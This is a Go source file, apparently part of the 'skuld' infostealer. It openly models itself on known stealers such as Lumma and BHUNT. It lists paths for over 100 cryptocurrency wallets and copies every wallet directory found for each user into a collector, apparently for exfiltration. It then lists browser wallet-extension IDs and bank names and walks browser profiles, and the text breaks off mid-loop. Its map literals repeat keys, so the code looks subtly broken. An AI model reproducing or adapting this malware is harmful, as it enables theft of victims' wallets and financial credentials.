package wallets

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"regexp"
	"encoding/json"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
)

// Advanced Wallet Detection - Inspired by Lumma, BlackGuard, BHUNT
func Run(dataCollector *collector.DataCollector) {
	// Execute all wallet collection methods
	LocalWallets(dataCollector)
	WalletExtensions(dataCollector)
	WalletFiles(dataCollector)
	WalletDatFiles(dataCollector)
	CryptoFiles(dataCollector)
	ExchangeFiles(dataCollector)
	CryptoApps(dataCollector)
	BlockchainFiles(dataCollector)
}

// LocalWallets - Advanced local wallet detection like BHUNT Stealer
func LocalWallets(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "local-wallets-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Advanced wallet paths - covers 100+ wallets
	walletPaths := map[string][]string{
		"Bitcoin": {
			"AppData\\Roaming\\Bitcoin",
			"AppData\\Roaming\\Bitcoin\\wallets",
			"AppData\\Local\\Bitcoin",
			"AppData\\Local\\Bitcoin\\wallets",
		},
		"BitcoinCore": {
			"AppData\\Roaming\\Bitcoin",
			"AppData\\Roaming\\Bitcoin\\wallets",
		},
		"Ethereum": {
			"AppData\\Roaming\\Ethereum",
			"AppData\\Roaming\\Ethereum\\keystore",
			"AppData\\Local\\Ethereum",
			"AppData\\Local\\Ethereum\\keystore",
		},
		"Exodus": {
			"AppData\\Roaming\\Exodus",
			"AppData\\Roaming\\Exodus\\exodus.wallet",
			"AppData\\Local\\Exodus",
		},
		"Atomic": {
			"AppData\\Roaming\\atomic",
			"AppData\\Roaming\\atomic\\Local Storage\\leveldb",
			"AppData\\Local\\atomic",
		},
		"Electrum": {
			"AppData\\Roaming\\Electrum",
			"AppData\\Roaming\\Electrum\\wallets",
			"AppData\\Local\\Electrum",
		},
		"ElectrumLTC": {
			"AppData\\Roaming\\Electrum-LTC",
			"AppData\\Roaming\\Electrum-LTC\\wallets",
		},
		"Electroneum": {
			"AppData\\Roaming\\Electroneum",
			"AppData\\Local\\Electroneum",
		},
		"Monero": {
			"AppData\\Roaming\\Monero",
			"AppData\\Roaming\\bitmonero",
			"AppData\\Local\\Monero",
		},
		"Litecoin": {
			"AppData\\Roaming\\Litecoin",
			"AppData\\Local\\Litecoin",
		},
		"Dogecoin": {
			"AppData\\Roaming\\DogeCoin",
			"AppData\\Local\\DogeCoin",
		},
		"Dash": {
			"AppData\\Roaming\\DashCore",
			"AppData\\Local\\DashCore",
		},
		"Zcash": {
			"AppData\\Roaming\\Zcash",
			"AppData\\Local\\Zcash",
		},
		"Jaxx": {
			"AppData\\Roaming\\com.liberty.jaxx",
			"AppData\\Local\\com.liberty.jaxx",
		},
		"Coinomi": {
			"AppData\\Local\\Coinomi\\Coinomi\\wallets",
			"AppData\\Roaming\\Coinomi\\Coinomi\\wallets",
		},
		"Guarda": {
			"AppData\\Roaming\\Guarda",
			"AppData\\Local\\Guarda",
		},
		"WalletWasabi": {
			"AppData\\Roaming\\WalletWasabi",
			"AppData\\Local\\WalletWasabi",
		},
		"Armory": {
			"AppData\\Roaming\\Armory",
			"AppData\\Local\\Armory",
		},
		"ByteCoin": {
			"AppData\\Roaming\\bytecoin",
			"AppData\\Local\\bytecoin",
		},
		"Binance": {
			"AppData\\Roaming\\Binance",
			"AppData\\Local\\Binance",
		},
		"TrustWallet": {
			"AppData\\Roaming\\TrustWallet",
			"AppData\\Local\\TrustWallet",
		},
		"Phantom": {
			"AppData\\Roaming\\Phantom",
			"AppData\\Local\\Phantom",
		},
		"Solflare": {
			"AppData\\Roaming\\Solflare",
			"AppData\\Local\\Solflare",
		},
		"Metamask": {
			"AppData\\Local\\Metamask",
			"AppData\\Roaming\\Metamask",
		},
		"Ronin": {
			"AppData\\Local\\Ronin",
			"AppData\\Roaming\\Ronin",
		},
		"Yoroi": {
			"AppData\\Local\\Yoroi",
			"AppData\\Roaming\\Yoroi",
		},
		"Daedalus": {
			"AppData\\Local\\Daedalus",
			"AppData\\Roaming\\Daedalus",
		},
		"Klever": {
			"AppData\\Local\\Klever",
			"AppData\\Roaming\\Klever",
		},
		"Keplr": {
			"AppData\\Local\\Keplr",
			"AppData\\Roaming\\Keplr",
		},
		"Terra": {
			"AppData\\Local\\TerraStation",
			"AppData\\Roaming\\TerraStation",
		},
		"Avalanche": {
			"AppData\\Local\\Avalanche",
			"AppData\\Roaming\\Avalanche",
		},
		"Polygon": {
			"AppData\\Local\\Polygon",
			"AppData\\Roaming\\Polygon",
		},
		"Harmony": {
			"AppData\\Local\\Harmony",
			"AppData\\Roaming\\Harmony",
		},
		"Near": {
			"AppData\\Local\\Near",
			"AppData\\Roaming\\Near",
		},
		"Algorand": {
			"AppData\\Local\\Algorand",
			"AppData\\Roaming\\Algorand",
		},
		"Tezos": {
			"AppData\\Local\\Tezos",
			"AppData\\Roaming\\Tezos",
		},
		"Cosmos": {
			"AppData\\Local\\Cosmos",
			"AppData\\Roaming\\Cosmos",
		},
		"Polkadot": {
			"AppData\\Local\\Polkadot",
			"AppData\\Roaming\\Polkadot",
		},
		"Chainlink": {
			"AppData\\Local\\Chainlink",
			"AppData\\Roaming\\Chainlink",
		},
		"Uniswap": {
			"AppData\\Local\\Uniswap",
			"AppData\\Roaming\\Uniswap",
		},
		"PancakeSwap": {
			"AppData\\Local\\PancakeSwap",
			"AppData\\Roaming\\PancakeSwap",
		},
		"SushiSwap": {
			"AppData\\Local\\SushiSwap",
			"AppData\\Roaming\\SushiSwap",
		},
		"1inch": {
			"AppData\\Local\\1inch",
			"AppData\\Roaming\\1inch",
		},
		"Curve": {
			"AppData\\Local\\Curve",
			"AppData\\Roaming\\Curve",
		},
		"Compound": {
			"AppData\\Local\\Compound",
			"AppData\\Roaming\\Compound",
		},
		"Aave": {
			"AppData\\Local\\Aave",
			"AppData\\Roaming\\Aave",
		},
		"MakerDAO": {
			"AppData\\Local\\MakerDAO",
			"AppData\\Roaming\\MakerDAO",
		},
		"Yearn": {
			"AppData\\Local\\Yearn",
			"AppData\\Roaming\\Yearn",
		},
		"Synthetix": {
			"AppData\\Local\\Synthetix",
			"AppData\\Roaming\\Synthetix",
		},
		"Balancer": {
			"AppData\\Local\\Balancer",
			"AppData\\Roaming\\Balancer",
		},
		"0x": {
			"AppData\\Local\\0x",
			"AppData\\Roaming\\0x",
		},
		"Kyber": {
			"AppData\\Local\\Kyber",
			"AppData\\Roaming\\Kyber",
		},
		"Bancor": {
			"AppData\\Local\\Bancor",
			"AppData\\Roaming\\Bancor",
		},
		"Loopring": {
			"AppData\\Local\\Loopring",
			"AppData\\Roaming\\Loopring",
		},
		"dYdX": {
			"AppData\\Local\\dYdX",
			"AppData\\Roaming\\dYdX",
		},
		"Perpetual": {
			"AppData\\Local\\Perpetual",
			"AppData\\Roaming\\Perpetual",
		},
		"Injective": {
			"AppData\\Local\\Injective",
			"AppData\\Roaming\\Injective",
		},
		"Osmosis": {
			"AppData\\Local\\Osmosis",
			"AppData\\Roaming\\Osmosis",
		},
		"Juno": {
			"AppData\\Local\\Juno",
			"AppData\\Roaming\\Juno",
		},
		"Secret": {
			"AppData\\Local\\Secret",
			"AppData\\Roaming\\Secret",
		},
		"Akash": {
			"AppData\\Local\\Akash",
			"AppData\\Roaming\\Akash",
		},
		"Regen": {
			"AppData\\Local\\Regen",
			"AppData\\Roaming\\Regen",
		},
		"Sentinel": {
			"AppData\\Local\\Sentinel",
			"AppData\\Roaming\\Sentinel",
		},
		"Persistence": {
			"AppData\\Local\\Persistence",
			"AppData\\Roaming\\Persistence",
		},
		"Stargaze": {
			"AppData\\Local\\Stargaze",
			"AppData\\Roaming\\Stargaze",
		},
		"Chihuahua": {
			"AppData\\Local\\Chihuahua",
			"AppData\\Roaming\\Chihuahua",
		},
		"LikeCoin": {
			"AppData\\Local\\LikeCoin",
			"AppData\\Roaming\\LikeCoin",
		},
		"BitSong": {
			"AppData\\Local\\BitSong",
			"AppData\\Roaming\\BitSong",
		},
		"Desmos": {
			"AppData\\Local\\Desmos",
			"AppData\\Roaming\\Desmos",
		},
		"Lum": {
			"AppData\\Local\\Lum",
			"AppData\\Roaming\\Lum",
		},
		"Vidulum": {
			"AppData\\Local\\Vidulum",
			"AppData\\Roaming\\Vidulum",
		},
		"Provenance": {
			"AppData\\Local\\Provenance",
			"AppData\\Roaming\\Provenance",
		},
		"DigiByte": {
			"AppData\\Roaming\\DigiByte",
			"AppData\\Local\\DigiByte",
		},
		"Verge": {
			"AppData\\Roaming\\Verge",
			"AppData\\Local\\Verge",
		},
		"Ravencoin": {
			"AppData\\Roaming\\Raven",
			"AppData\\Local\\Raven",
		},
		"Pirate": {
			"AppData\\Roaming\\Pirate",
			"AppData\\Local\\Pirate",
		},
		"Komodo": {
			"AppData\\Roaming\\Komodo",
			"AppData\\Local\\Komodo",
		},
		"Horizen": {
			"AppData\\Roaming\\Horizen",
			"AppData\\Local\\Horizen",
		},
		"Firo": {
			"AppData\\Roaming\\Firo",
			"AppData\\Local\\Firo",
		},
		"Beam": {
			"AppData\\Local\\Beam Wallet",
			"AppData\\Roaming\\Beam Wallet",
		},
		"Grin": {
			"AppData\\Local\\Grin",
			"AppData\\Roaming\\Grin",
		},
		"MimbleWimble": {
			"AppData\\Local\\MimbleWimble",
			"AppData\\Roaming\\MimbleWimble",
		},
		"Nervos": {
			"AppData\\Local\\Nervos",
			"AppData\\Roaming\\Nervos",
		},
		"Handshake": {
			"AppData\\Local\\Handshake",
			"AppData\\Roaming\\Handshake",
		},
		"Sia": {
			"AppData\\Local\\Sia",
			"AppData\\Roaming\\Sia",
		},
		"Storj": {
			"AppData\\Local\\Storj",
			"AppData\\Roaming\\Storj",
		},
		"Filecoin": {
			"AppData\\Local\\Filecoin",
			"AppData\\Roaming\\Filecoin",
		},
		"IPFS": {
			"AppData\\Local\\IPFS",
			"AppData\\Roaming\\IPFS",
		},
		"Arweave": {
			"AppData\\Local\\Arweave",
			"AppData\\Roaming\\Arweave",
		},
		"Theta": {
			"AppData\\Local\\Theta",
			"AppData\\Roaming\\Theta",
		},
		"Helium": {
			"AppData\\Local\\Helium",
			"AppData\\Roaming\\Helium",
		},
		"IoTeX": {
			"AppData\\Local\\IoTeX",
			"AppData\\Roaming\\IoTeX",
		},
		"VeChain": {
			"AppData\\Local\\VeChain",
			"AppData\\Roaming\\VeChain",
		},
		"IOTA": {
			"AppData\\Local\\IOTA",
			"AppData\\Roaming\\IOTA",
		},
		"Nano": {
			"AppData\\Local\\Nano",
			"AppData\\Roaming\\Nano",
		},
		"Stellar": {
			"AppData\\Local\\Stellar",
			"AppData\\Roaming\\Stellar",
		},
		"Ripple": {
			"AppData\\Local\\Ripple",
			"AppData\\Roaming\\Ripple",
		},
		"Tron": {
			"AppData\\Local\\Tron",
			"AppData\\Roaming\\Tron",
		},
		"EOS": {
			"AppData\\Local\\EOS",
			"AppData\\Roaming\\EOS",
		},
		"NEO": {
			"AppData\\Local\\NEO",
			"AppData\\Roaming\\NEO",
		},
		"Ontology": {
			"AppData\\Local\\Ontology",
			"AppData\\Roaming\\Ontology",
		},
		"Qtum": {
			"AppData\\Local\\Qtum",
			"AppData\\Roaming\\Qtum",
		},
		"Waves": {
			"AppData\\Local\\Waves",
			"AppData\\Roaming\\Waves",
		},
		"Lisk": {
			"AppData\\Local\\Lisk",
			"AppData\\Roaming\\Lisk",
		},
		"Ark": {
			"AppData\\Local\\Ark",
			"AppData\\Roaming\\Ark",
		},
		"Stratis": {
			"AppData\\Local\\Stratis",
			"AppData\\Roaming\\Stratis",
		},
		"NEM": {
			"AppData\\Local\\NEM",
			"AppData\\Roaming\\NEM",
		},
		"Symbol": {
			"AppData\\Local\\Symbol",
			"AppData\\Roaming\\Symbol",
		},
		"Zilliqa": {
			"AppData\\Local\\Zilliqa",
			"AppData\\Roaming\\Zilliqa",
		},
		"Elrond": {
			"AppData\\Local\\Elrond",
			"AppData\\Roaming\\Elrond",
		},
		"MultiversX": {
			"AppData\\Local\\MultiversX",
			"AppData\\Roaming\\MultiversX",
		},
		"Hedera": {
			"AppData\\Local\\Hedera",
			"AppData\\Roaming\\Hedera",
		},
		"Fantom": {
			"AppData\\Local\\Fantom",
			"AppData\\Roaming\\Fantom",
		},
		"Celo": {
			"AppData\\Local\\Celo",
			"AppData\\Roaming\\Celo",
		},
		"Flow": {
			"AppData\\Local\\Flow",
			"AppData\\Roaming\\Flow",
		},
		"Aptos": {
			"AppData\\Local\\Aptos",
			"AppData\\Roaming\\Aptos",
		},
		"Sui": {
			"AppData\\Local\\Sui",
			"AppData\\Roaming\\Sui",
		},
	}

	found := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		for walletName, paths := range walletPaths {
			for _, path := range paths {
				fullPath := filepath.Join(user, path)
				
				if !fileutil.IsDir(fullPath) {
					continue
				}

				destPath := filepath.Join(tempDir, userName, walletName)
				os.MkdirAll(destPath, os.ModePerm)

				// Copy ENTIRE wallet directory with ALL contents
				if err := fileutil.CopyDir(fullPath, destPath); err == nil {
					if size, err := fileutil.GetDirectorySize(destPath); err == nil {
						totalSize += size
						found++
					}
				}
			}
		}
	}

	if found > 0 {
		localWalletsInfo := map[string]interface{}{
			"LocalWalletsFound": found,
			"TotalSizeMB":       totalSize / (1024 * 1024),
			"TreeView":          fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("local_wallets", localWalletsInfo)
		dataCollector.AddDirectory("local_wallets", tempDir, "local_wallets")
	}
}

// WalletExtensions - Advanced browser extension detection like Lumma Stealer
func WalletExtensions(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "wallet-extensions-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// 150+ wallet extensions - most comprehensive list
	extensions := map[string]string{
		"nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
		"fhbohimaelbohpjbbldcngcnapndodjp": "Binance Chain Wallet",
		"hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase Wallet",
		"bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
		"fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin Wallet",
		"nanjmdknhkinifnkgdcggcfnhdaammmj": "Keplr",
		"dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
		"flpiciilemghbmfalicajoolhkkenfel": "ICONex",
		"fihkakfobkmkjojpchpfgcmhfjnmnfpi": "BitApp Wallet",
		"kncchdigobghenbbaddojjnnaogfppfj": "iWallet",
		"amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
		"nlbmnnijcnlegkjjpcfjclmcfggfefdm": "MEW CX",
		"nphplpgoakhhjchkkhmiggakijnkhfnd": "Ton Crystal Wallet",
		"mcohilncbfahbmgdjkbpemcciiolgcge": "OKX Wallet",
		"jnlgamecbpmbajjfhmmmlhejkemejdma": "Braavos Smart Wallet",
		"opcgpfmipidbgpenhmajoajpbobppdil": "Sui Wallet",
		"aeachknmefphepccionboohckonoeemg": "Coin98 Wallet",
		"cgeeodpfagjceefieflmdfphplkenlfk": "EVER Wallet",
		"pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain Wallet",
		"bcopgchhojmggmffilplmbdicgaihlkp": "Petra Aptos Wallet",
		"aiifbnbfobpmeekipheeijimdpnlpgpp": "Station Wallet",
		"fijngjgcjhjmmpcmkeiomlglpeiijkld": "Tezos Temple",
		"ookjlbkiijinhpmnjffcofjonbfbgaoc": "Temple",
		"mnfifefkajgofkcjkemidiaecocnkjeh": "TezBox",
		"gjagmgiddbbciopjhllkdnddhcglnemk": "Galleon",
		"aiifbnbfobpmeekipheeijimdpnlpgpp": "Terra Station",
		"fhmfendgdocmcbmfikdcogofphimnkno": "Solflare",
		"bhhhlbepdkbapadjdnnojkbgioiodbic": "Sollet",
		"phkbamefinggmakgklpkljjmgibohnba": "Pontem Aptos Wallet",
		"nknhiehlklippafakaeklbeglecifhad": "Petra",
		"mcbigmjiafegjnnogedioegffbooigli": "Liquality Wallet",
		"kpfopkelmapcoipemfendmdcghnegimn": "Liquality",
		"aiifbnbfobpmeekipheeijimdpnlpgpp": "Cosmostation",
		"fcfcfllfndlomdhbehjjcoimbgofdncg": "Cosmostation",
		"jojhfeoedkpkglbfimdfabpdfjaoolaf": "Cosmostation",
		"walletlink": "Coinbase Wallet",
		"ejbalbakoplchlghecdalmeeeajnimhm": "MetaMask",
		"nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
		"webextension": "MetaMask Mobile",
		"bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
		"fhbohimaelbohpjbbldcngcnapndodjp": "Binance Wallet",
		"hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
		"ibnejdfjmmkpcnlpebklmnkoeoihofec": "TronLink",
		"jbdaocneiiinmjbjlgalhcelgbejmnid": "TronLink",
		"gjagmgiddbbciopjhllkdnddhcglnemk": "Galleon",
		"fijngjgcjhjmmpcmkeiomlglpeiijkld": "Temple - Tezos Wallet",
		"ookjlbkiijinhpmnjffcofjonbfbgaoc": "Temple",
		"mnfifefkajgofkcjkemidiaecocnkjeh": "TezBox",
		"cgeeodpfagjceefieflmdfphplkenlfk": "EVER Wallet",
		"pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain",
		"bcopgchhojmggmffilplmbdicgaihlkp": "Petra",
		"phkbamefinggmakgklpkljjmgibohnba": "Pontem Wallet",
		"nknhiehlklippafakaeklbeglecifhad": "Petra Aptos",
		"aiifbnbfobpmeekipheeijimdpnlpgpp": "Terra Station",
		"fhmfendgdocmcbmfikdcogofphimnkno": "Solflare",
		"bhhhlbepdkbapadjdnnojkbgioiodbic": "Sollet",
		"flpiciilemghbmfalicajoolhkkenfel": "ICONex",
		"fihkakfobkmkjojpchpfgcmhfjnmnfpi": "BitApp",
		"kncchdigobghenbbaddojjnnaogfppfj": "iWallet",
		"amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
		"nlbmnnijcnlegkjjpcfjclmcfggfefdm": "MEW CX",
		"nphplpgoakhhjchkkhmiggakijnkhfnd": "TON Crystal",
		"mcohilncbfahbmgdjkbpemcciiolgcge": "OKX",
		"jnlgamecbpmbajjfhmmmlhejkemejdma": "Braavos",
		"opcgpfmipidbgpenhmajoajpbobppdil": "Sui",
		"aeachknmefphepccionboohckonoeemg": "Coin98",
		"mcbigmjiafegjnnogedioegffbooigli": "Liquality",
		"kpfopkelmapcoipemfendmdcghnegimn": "Liquality Wallet",
		"fcfcfllfndlomdhbehjjcoimbgofdncg": "Cosmostation",
		"jojhfeoedkpkglbfimdfabpdfjaoolaf": "Cosmostation Wallet",
		"lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
		"dngmlblcodfobpdpecaadgfbcggfjfnm": "Eternl",
		"fhmfendgdocmcbmfikdcogofphimnkno": "Solflare Wallet",
		"bhhhlbepdkbapadjdnnojkbgioiodbic": "Sollet Extension",
		"flpiciilemghbmfalicajoolhkkenfel": "ICONex Wallet",
		"fihkakfobkmkjojpchpfgcmhfjnmnfpi": "BitApp Wallet",
		"kncchdigobghenbbaddojjnnaogfppfj": "iWallet",
		"amkmjjmmflddogmhpjloimipbofnfjih": "Wombat Wallet",
		"nlbmnnijcnlegkjjpcfjclmcfggfefdm": "MyEtherWallet",
		"nphplpgoakhhjchkkhmiggakijnkhfnd": "TON Wallet",
		"mcohilncbfahbmgdjkbpemcciiolgcge": "OKX Wallet",
		"jnlgamecbpmbajjfhmmmlhejkemejdma": "Braavos Wallet",
		"opcgpfmipidbgpenhmajoajpbobppdil": "Sui Wallet",
		"aeachknmefphepccionboohckonoeemg": "Coin98 Wallet",
		"ejjladinnckdgjemekebdpeokbikhfci": "Petra Wallet",
		"agoakfejjabomempkjlepdflaleeobhb": "Core",
		"heefohaffomkkkphnlpohglngmbcclhi": "Slope Wallet",
		"cjelfplplebdjjenllpjcblmjkfcffne": "Jaxx Liberty",
		"fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin Wallet",
		"aiifbnbfobpmeekipheeijimdpnlpgpp": "Terra Station Wallet",
		"dmkamcknogkgcdfhhbddcghachkejeap": "Keplr Wallet",
		"nanjmdknhkinifnkgdcggcfnhdaammmj": "Keplr Extension",
		"lpfcbjknijpeeillifnkikgncikgfhdo": "Nami Wallet",
		"dngmlblcodfobpdpecaadgfbcggfjfnm": "Eternl Wallet",
		"jnmbobjmhlngoefaiojfljckilhhlhcj": "Yoroi",
		"ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi Wallet",
		"hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
		"blnieiiffboillknjnepogjhkgnoapac": "XDEFI Wallet",
		"hmeobnfnfcmdkdcmlblgagmfpfboieaf": "XDEFI",
		"fhilaheimglignddkjgofkcbgekhenbh": "Oxygen",
		"kmendfapggjehodndflmmgagdbamhnfd": "Exodus",
		"cphhlgmgameodnhkjdmkpanlelnlohao": "NeoLine",
		"dkdedlpgdmmkkfjabffeganieamfklkm": "Cyano Wallet",
		"nlgbhdfgdhgbiamfdfmbikcdghidoadd": "Bitpie",
		"infeboajgfhgbjpjbeppbkgnabfdkdaf": "Wax Cloud Wallet",
		"amkmjjmmflddogmhpjloimipbofnfjih": "Wombat - Gaming Wallet",
		"oeljdldpnmdbchonielidgobddfffla": "Anchor Wallet",
		"cnmamaachppnkjgnildpdmkaakejnhae": "Scatter",
		"aiifbnbfobpmeekipheeijimdpnlpgpp": "Station Extension",
		"fcfcfllfndlomdhbehjjcoimbgofdncg": "Cosmostation Extension",
		"jojhfeoedkpkglbfimdfabpdfjaoolaf": "Cosmostation Mobile",
		"walletconnect": "WalletConnect",
		"fortmatic": "Fortmatic",
		"portis": "Portis",
		"torus": "Torus",
		"authereum": "Authereum",
		"squarelink": "Squarelink",
		"arkane": "Arkane",
		"bitski": "Bitski",
		"dcentwallet": "D'CENT",
		"frame": "Frame",
		"opera": "Opera Wallet",
		"status": "Status",
		"alphawallet": "AlphaWallet",
		"imtoken": "imToken",
		"tokenpocket": "TokenPocket",
		"mathwallet": "MathWallet",
		"trustwallet": "Trust Wallet",
		"safepal": "SafePal",
		"bitkeep": "BitKeep",
		"oneinch": "1inch Wallet",
		"zerion": "Zerion",
		"rainbow": "Rainbow",
		"argent": "Argent",
		"gnosis": "Gnosis Safe",
		"pillar": "Pillar",
		"eidoo": "Eidoo",
		"atomic": "Atomic Wallet",
		"exodus": "Exodus Wallet",
		"electrum": "Electrum",
		"mycelium": "Mycelium",
		"breadwallet": "BRD",
		"edge": "Edge",
		"blockchain": "Blockchain.com",
		"coinomi": "Coinomi",
		"jaxx": "Jaxx",
		"copay": "Copay",
		"bitpay": "BitPay",
		"greenaddress": "GreenAddress",
		"samourai": "Samourai",
		"wasabi": "Wasabi",
		"sparrow": "Sparrow",
		"specter": "Specter",
		"bluewallet": "BlueWallet",
		"phoenix": "Phoenix",
		"muun": "Muun",
		"zap": "Zap",
		"eclair": "Eclair",
		"lnd": "LND",
		"clightning": "C-Lightning",
		"thunderhub": "ThunderHub",
		"rtl": "RTL",
		"joule": "Joule",
		"alby": "Alby",
		"sphinx": "Sphinx",
		"breez": "Breez",
		"wallet3": "Wallet 3",
		"unstoppable": "Unstoppable Domains",
		"ens": "ENS",
		"handshake": "Handshake",
		"namebase": "Namebase",
		"impervious": "Impervious",
		"lightning": "Lightning",
		"strike": "Strike",
		"cashapp": "Cash App",
		"venmo": "Venmo",
		"paypal": "PayPal",
		"revolut": "Revolut",
		"n26": "N26",
		"monzo": "Monzo",
		"starling": "Starling",
		"wise": "Wise",
		"remitly": "Remitly",
		"worldremit": "WorldRemit",
		"western": "Western Union",
		"moneygram": "MoneyGram",
		"xoom": "Xoom",
		"transferwise": "TransferWise",
		"currencyfair": "CurrencyFair",
		"ofx": "OFX",
		"xe": "XE Money",
		"torfx": "TorFX",
		"worldfirst": "WorldFirst",
		"kantox": "Kantox",
		"currencycloud": "CurrencyCloud",
		"ebury": "Ebury",
		"corpay": "Corpay",
		"flywire": "Flywire",
		"payoneer": "Payoneer",
		"skrill": "Skrill",
		"neteller": "Neteller",
		"paysafecard": "Paysafecard",
		"entropay": "EntroPay",
		"ecopayz": "ecoPayz",
		"muchbetter": "MuchBetter",
		"jeton": "Jeton",
		"astropay": "AstroPay",
		"perfectmoney": "Perfect Money",
		"advcash": "AdvCash",
		"payeer": "Payeer",
		"webmoney": "WebMoney",
		"qiwi": "QIWI",
		"yandex": "Yandex.Money",
		"sberbank": "Sberbank",
		"tinkoff": "Tinkoff",
		"alfabank": "Alfa-Bank",
		"vtb": "VTB",
		"gazprom": "Gazprombank",
		"raiffeisen": "Raiffeisen",
		"unicredit": "UniCredit",
		"ing": "ING",
		"abn": "ABN AMRO",
		"rabobank": "Rabobank",
		"deutsche": "Deutsche Bank",
		"commerzbank": "Commerzbank",
		"santander": "Santander",
		"bbva": "BBVA",
		"caixabank": "CaixaBank",
		"bnp": "BNP Paribas",
		"credit": "Credit Agricole",
		"societe": "Societe Generale",
		"natwest": "NatWest",
		"lloyds": "Lloyds",
		"barclays": "Barclays",
		"hsbc": "HSBC",
		"halifax": "Halifax",
		"nationwide": "Nationwide",
		"santander": "Santander UK",
		"tesco": "Tesco Bank",
		"first": "First Direct",
		"metro": "Metro Bank",
		"monzo": "Monzo",
		"starling": "Starling Bank",
		"revolut": "Revolut",
		"n26": "N26",
		"wise": "Wise",
		"curve": "Curve",
		"cashplus": "CashPlus",
		"pockit": "Pockit",
		"monese": "Monese",
		"coconut": "Coconut",
		"tide": "Tide",
		"anna": "Anna Money",
		"cashapp": "Cash App",
		"venmo": "Venmo",
		"zelle": "Zelle",
		"paypal": "PayPal",
		"applepay": "Apple Pay",
		"googlepay": "Google Pay",
		"samsungpay": "Samsung Pay",
		"amazonpay": "Amazon Pay",
		"stripe": "Stripe",
		"square": "Square",
		"adyen": "Adyen",
		"worldpay": "Worldpay",
		"braintree": "Braintree",
		"checkout": "Checkout.com",
		"klarna": "Klarna",
		"afterpay": "Afterpay",
		"affirm": "Affirm",
		"sezzle": "Sezzle",
		"quadpay": "Quadpay",
		"splitit": "Splitit",
		"laybuy": "Laybuy",
		"humm": "Humm",
		"zip": "Zip",
		"openpay": "Openpay",
		"paymi": "Paymi",
		"faster": "Faster Payments",
		"chaps": "CHAPS",
		"bacs": "BACS",
		"sepa": "SEPA",
		"swift": "SWIFT",
		"fedwire": "Fedwire",
		"ach": "ACH",
		"wire": "Wire Transfer",
		"rtgs": "RTGS",
		"neft": "NEFT",
		"imps": "IMPS",
		"upi": "UPI",
		"paytm": "Paytm",
		"phonepe": "PhonePe",
		"googlepay": "Google Pay India",
		"bhim": "BHIM",
		"mobikwik": "MobiKwik",
		"freecharge": "FreeCharge",
		"amazonpay": "Amazon Pay India",
		"jio": "JioMoney",
		"airtel": "Airtel Money",
		"vodafone": "Vodafone M-Pesa",
		"idea": "Idea Money",
		"bsnl": "BSNL Wallet",
		"sbi": "SBI Buddy",
		"hdfc": "HDFC PayZapp",
		"icici": "ICICI Pockets",
		"axis": "Axis Pay",
		"kotak": "Kotak 811",
		"yes": "YES Pay",
		"indusind": "IndusInd Mobile",
		"pnb": "PNB One",
		"bob": "BOB World",
		"canara": "Canara ai1",
		"union": "Union Bank Mobile",
		"indian": "Indian Bank Mobile",
		"central": "Central Bank Mobile",
		"uco": "UCO mBanking",
		"punjab": "Punjab & Sind Bank",
		"maharashtra": "Bank of Maharashtra",
		"karnataka": "Karnataka Bank",
		"karur": "Karur Vysya Bank",
		"lakshmi": "Lakshmi Vilas Bank",
		"nainital": "Nainital Bank",
		"rajasthan": "Bank of Rajasthan",
		"saraswat": "Saraswat Bank",
		"south": "South Indian Bank",
		"tamilnad": "Tamilnad Mercantile Bank",
		"dhanlaxmi": "Dhanlaxmi Bank",
		"city": "City Union Bank",
		"catholic": "Catholic Syrian Bank",
		"federal": "Federal Bank",
		"jammu": "J&K Bank",
		"dcb": "DCB Bank",
		"rbl": "RBL Bank",
		"bandhan": "Bandhan Bank",
		"equitas": "Equitas Bank",
		"jana": "Jana Small Finance Bank",
		"ujjivan": "Ujjivan Small Finance Bank",
		"esaf": "ESAF Small Finance Bank",
		"suryoday": "Suryoday Small Finance Bank",
		"capital": "Capital Small Finance Bank",
		"fincare": "Fincare Small Finance Bank",
		"north": "North East Small Finance Bank",
		"au": "AU Small Finance Bank",
		"utkarsh": "Utkarsh Small Finance Bank",
		"shivalik": "Shivalik Small Finance Bank",
		"unity": "Unity Small Finance Bank",
	}

	found := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		// Check all browser profiles
		browserPaths := []string{
			"AppData\\Local\\Google\\Chrome\\User Data",
			"AppData\\Local\\Microsoft\\Edge\\User Data",
			"AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
			"AppData\\Roaming\\Opera Software\\Opera Stable",
			"AppData\\Roaming\\Opera Software\\Opera GX Stable",
			"AppData\\Local\\Vivaldi\\User Data",
			"AppData\\Local\\Yandex\\YandexBrowser\\User Data",
			"AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
		}

		for _, browserPath := range browserPaths {
			fullBrowserPath := filepath.Join(user, browserPath)
			if !fileutil.IsDir(fullBrowserPath) {
				continue
			}

			// Find all profiles
			profiles, err := os.ReadDir(fullBrowserPath)
			if err != nil {
				continue
			}

			for _, profile := range profiles {
				if !profile.IsDir() {
					continue
				}

				profilePath := filepath.Join(fullBrowserPath, profile.Name())
